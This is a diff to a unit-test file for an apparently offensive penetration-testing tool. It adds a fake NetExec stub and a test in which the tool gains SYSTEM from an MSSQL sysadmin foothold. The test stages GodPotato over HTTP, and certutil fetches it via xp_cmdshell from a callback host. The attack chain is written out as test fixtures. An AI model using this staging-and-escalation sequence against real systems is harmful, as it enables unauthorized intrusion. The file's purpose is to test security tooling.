@@ -219,6 +219,41 @@ if "--continue-on-success" in a:
 sys.exit(0)
 '''
 
+# an MSSQL-only sysadmin foothold: no smb/ssh, so a Potato can't be --put-file'd — the loop
+# must download-stage it (serve over HTTP, certutil fetches it over xp_cmdshell), then prove.
+FAKE_NXC_MSSQL_DL = r'''#!/usr/bin/env python3
+import os, re, sys
+try:
+    import urllib.request
+except Exception:
+    urllib = None
+a = sys.argv[1:]
+gp = os.path.join(os.environ.get("FK_STAGED", "/tmp"), "gp.present")
+flag = "-x" if "-x" in a else ("-X" if "-X" in a else None)
+if flag:
+    cmd = a[a.index(flag) + 1]
+    if "certutil" in cmd:
+        m = re.search(r'https?://[^"\s]+', cmd)
+        if m and urllib:
+            try:
+                urllib.request.urlopen(m.group(0), timeout=5).read()   # really fetch it
+            except Exception:
+                pass
+        open(gp, "w").close()
+        print("CertUtil: -URLCache command completed successfully.")
+    elif "GodPotato" in cmd:
+        print("nt authority\\system" if os.path.exists(gp)
+              else "'GodPotato.exe' is not recognized as an internal or external command")
+    elif "whoami /priv" in cmd:
+        print("SeImpersonatePrivilege        Enabled")
+    sys.exit(0)
+if "--continue-on-success" in a:   # mssql sysadmin (Pwn3d!)
+    print("MSSQL 10.0.0.9 1433 SQL01 [*] Windows Server 2019 (name:SQL01) (domain:corp.local)")
+    print("MSSQL 10.0.0.9 1433 SQL01 [+] corp.local\\sa:pw (Pwn3d!)")
+    sys.exit(0)
+sys.exit(0)
+'''
+
 FAKE_CERTIPY = r'''#!/usr/bin/env python3
 print("""Certipy v4.8.2
 Certificate Templates
@@ -520,6 +555,34 @@ class FullFunnelTest(unittest.TestCase):
     def test_poc_check_runs_without_an_engagement(self):
         out = self.cli("poc", "--check")
         self.assertIn("build toolchain", out)
+
+    def test_escalate_download_stages_a_potato_over_mssql(self):
+        # MSSQL-only sysadmin: no --put-file path, so the loop download-stages GodPotato
+        # (serve over HTTP, certutil fetches it over xp_cmdshell), then proves SYSTEM.
+        self._install("nxc", FAKE_NXC_MSSQL_DL)
+        arsenal = os.path.join(self.dir, "arsenal")
+        os.makedirs(os.path.join(arsenal, "win-postex"))
+        open(os.path.join(arsenal, "win-postex", "GodPotato.exe"), "w").close()
+        staged = os.path.join(self.dir, "staged")
+        os.makedirs(staged)
+        for k, v in (("FIELDKIT_ARSENAL", arsenal), ("FK_STAGED", staged)):
+            old = os.environ.get(k)
+            os.environ[k] = v
+            self.addCleanup(lambda k=k, old=old:
+                            os.environ.__setitem__(k, old) if old is not None
+                            else os.environ.pop(k, None))
+
+        self.cli("init", "ACME")
+        self.cli("config", "set", "lhost=127.0.0.1")   # the callback the target fetches from
+        self.cli("add", "hosts", "10.0.0.9 SQL01")
+        self.cli("add", "cred", "corp.local/sa:pw", "--yes")
+        self.cli("spray", "mssql", "--yes")
+        self.cli("enum", "10.0.0.9", "--yes")
+
+        run = self.cli("escalate", "10.0.0.9", "--allow", "config-change", "--yes")
+        self.assertIn("serving", run)                  # download-staging kicked in
+        self.assertIn("PROVEN", run)
+        self.assertEqual(self.store().counts()["proven_findings"], 1)
 
     def test_prep_builds_and_playbooks_a_manual_route(self):
         # a writable service binary can't be one-shot (overwrite a running exe) -> fieldkit
